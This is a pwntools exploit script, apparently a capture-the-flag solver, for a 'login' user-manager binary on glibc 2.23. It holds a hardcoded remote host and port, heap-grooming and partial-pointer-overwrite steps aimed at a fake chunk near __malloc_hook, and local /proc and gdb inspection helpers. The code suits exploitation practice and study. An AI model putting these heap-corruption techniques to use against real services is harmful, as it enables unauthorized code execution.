from pwn import *
import os
import struct
import subprocess


ROOT = os.path.dirname(os.path.abspath(__file__))
os.chdir(ROOT)

context.binary = elf = ELF("./login", checksec=False)
libc = ELF("./libc-2.23.so", checksec=False)

HOST = "120.27.146.76"
PORT = 26473

LD = os.path.join(ROOT, "ubuntu223", "extract", "lib", "x86_64-linux-gnu", "ld-2.23.so")
LIBDIR = os.path.join(ROOT, "ubuntu223", "extract", "lib", "x86_64-linux-gnu")
MALLOC_HOOK_CHUNK_LO = 0x7AED


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.DOCKER:
        name = f"usermgr-{os.getpid()}"
        io = process([
            "docker.exe",
            "run",
            "--rm",
            "-i",
            "--name",
            name,
            "-v",
            f"{ROOT}:/work",
            "-w",
            "/work",
            "ubuntu:16.04",
            "/bin/bash",
            "-lc",
            "echo TARGET_PID=$$; exec ./login",
        ])
        line = io.recvline_contains(b"TARGET_PID=")
        io.container_name = name
        io.target_pid = int(line.split(b"=", 1)[1])
        return io
    return process([LD, "--library-path", LIBDIR, "./login"])


def menu(io, choice):
    io.recvuntil(b"Your choice:")
    io.sendline(str(choice).encode())


def register(io, idx, size, data=b""):
    menu(io, 2)
    io.recvuntil(b"Input the user id:")
    io.sendline(str(idx).encode())
    io.recvuntil(b"Input the password length:")
    io.sendline(str(size).encode())
    io.recvuntil(b"Input password:")
    if size:
        io.send(data)
    io.recvuntil(b"success!")


def login(io, idx, size, data):
    menu(io, 1)
    io.recvuntil(b"Input the user id:")
    io.sendline(str(idx).encode())
    io.recvuntil(b"Input the passwords length:")
    io.sendline(str(size).encode())
    io.recvuntil(b"Input the password:")
    if size:
        io.send(data)


def delete(io, idx):
    menu(io, 3)
    io.recvuntil(b"Input the user id:")
    io.sendline(str(idx).encode())
    io.recvuntil(b"success!")


def edit(io, idx, data):
    menu(io, 4)
    io.recvuntil(b"Input the user id:")
    io.sendline(str(idx).encode())
    io.recvuntil(b"Input new pass:")
    if data:
        io.send(data)


def set_u1_ptr(io, tail):
    edit(io, 0, p64(0) + p64(0x21) + tail)


def roman_step1(io, heap_hi_guess):
    register(io, 0, 0x18, b"A" * 0x18)
    delete(io, 0)
    register(io, 1, 0x18, b"\x00")
    register(io, 2, 0x60, b"F" * 8)
    register(io, 3, 0x80, b"U" * 8)
    register(io, 4, 0x60, b"R" * 8)

    delete(io, 3)
    register(io, 5, 0x60, b"x")
    delete(io, 4)
    delete(io, 2)

    set_u1_ptr(io, b"\x50")
    edit(io, 1, b"\xd0" + bytes([heap_hi_guess]))

    set_u1_ptr(io, b"\xe0")
    edit(io, 1, p16(MALLOC_HOOK_CHUNK_LO))

    register(io, 6, 0x60, b"A")
    register(io, 7, 0x60, b"B")
    register(io, 8, 0x60, b"C")


def get_local_addrs(io):
    maps = get_maps(io)
    pie = None
    for line in maps:
        if line.endswith("/work/login") and "r-xp" in line:
            pie = int(line.split("-", 1)[0], 16) - int(line.split()[2], 16)
            break
        if line.endswith("/login/login") and "r-xp" in line:
            pie = int(line.split("-", 1)[0], 16) - int(line.split()[2], 16)
            break
    if pie is None:
        raise RuntimeError("failed to locate PIE base")

    users = pie + elf.sym["users"]
    slots = struct.unpack("<10Q", read_mem(io, users, 0x50))
    u0, u1 = slots[:2]
    d0 = read_mem(io, u0, 0x30)
    d1 = read_mem(io, u1, 0x30)
    return {
        "pie": pie,
        "users": users,
        "slots": slots,
        "u0": u0,
        "u1": u1,
        "d0": d0,
        "d1": d1,
    }


def get_maps(io):
    if hasattr(io, "container_name"):
        return subprocess.check_output([
            "docker",
            "exec",
            io.container_name,
            "cat",
            f"/proc/{io.target_pid}/maps",
        ], text=True).splitlines()
    return open(f"/proc/{io.pid}/maps", "r", encoding="utf-8").read().splitlines()


def read_mem(io, addr, size):
    if hasattr(io, "container_name"):
        script = (
            f"open F,'</proc/{io.target_pid}/mem' or die $!;"
            f"seek F,{addr},0 or die $!;"
            f"read F,$b,{size};"
            "print unpack('H*',$b);"
        )
        data = subprocess.check_output([
            "docker",
            "exec",
            io.container_name,
            "perl",
            "-e",
            script,
        ], text=True)
        return bytes.fromhex(data)
    with open(f"/proc/{io.pid}/mem", "rb", buffering=0) as mem:
        mem.seek(addr)
        return mem.read(size)


def gdb_dump(io):
    if hasattr(io, "container_name"):
        raise RuntimeError("gdb_dump is not available for Docker mode")
    maps = get_maps(io)
    for line in maps:
        if "login" in line or "libc223" in line:
            print(line)
    pie = None
    for line in maps:
        if "/login/login" in line and "r-xp" in line:
            pie = int(line.split("-", 1)[0], 16) - int(line.split()[2], 16)
            break
    if pie is None:
        raise RuntimeError("failed to locate PIE base for gdb")
    users = pie + elf.sym["users"]
    script = "\n".join(
        [
            "set pagination off",
            "set exec-file-mismatch off",
            f"attach {io.pid}",
            f"set $users = (void**){users:#x}",
            "set $u0 = $users[0]",
            "set $u1 = $users[1]",
            'printf "u0=%p\\n", $u0',
            'printf "u1=%p\\n", $u1',
            "x/10gx $users",
            "x/6gx $u0",
            "x/6gx $u1",
            "x/32gx $u1",
            "detach",
            "quit",
        ]
    )
    out = subprocess.check_output(
        ["gdb", "-q", "-batch"] + sum([["-ex", line] for line in script.splitlines()], []),
        text=True,
    )
    return out


def main():
    io = start()

    if args.STEP1:
        roman_step1(io, int(args.GUESS or "0x60", 16))
    else:
        register(io, 0, 0x18, b"A" * 0x18)
        delete(io, 0)

    if args.ROMAN2:
        register(io, 1, 0x18, b"\x00")
        register(io, 2, 0x60, b"F" * 8)
        register(io, 3, 0x80, b"U" * 8)
        register(io, 4, 0x60, b"R" * 8)
        delete(io, 3)
        register(io, 5, 0x60, b"x")
        delete(io, 4)
        delete(io, 2)
    elif args.ROMAN:
        register(io, 1, 0x18, b"\x00")
        register(io, 2, 0x60, b"F" * 8)
        register(io, 3, 0x80, b"U" * 8)
        register(io, 4, 0x60, b"R" * 8)
    elif not args.STEP1 and (args.SEQ2 or args.SEQ3):
        register(io, 1, 0x18, b"\x00")
        register(io, 2, 0x80, b"B" * 8)
        if args.SEQ3:
            delete(io, 2)
    elif not args.STEP1:
        register(io, 1, 0, b"")

    if not args.REMOTE:
        try:
            info = get_local_addrs(io)
            log.info(f"PIE base = {info['pie']:#x}")
            log.info(f"users    = {info['users']:#x}")
            for i, slot in enumerate(info["slots"]):
                if slot:
                    log.info(f"user[{i}]  = {slot:#x}")
            log.info(f"u0       = {info['u0']:#x}")
            log.info(f"u1       = {info['u1']:#x}")
            log.info(f"d0       = {info['d0'].hex()}")
            log.info(f"d1       = {info['d1'].hex()}")
        except Exception as exc:
            log.warning(f"/proc inspection failed: {exc}")
        try:
            print(gdb_dump(io))
        except Exception as exc:
            log.warning(f"gdb attach failed: {exc}")

    io.interactive()


if __name__ == "__main__":
    main()
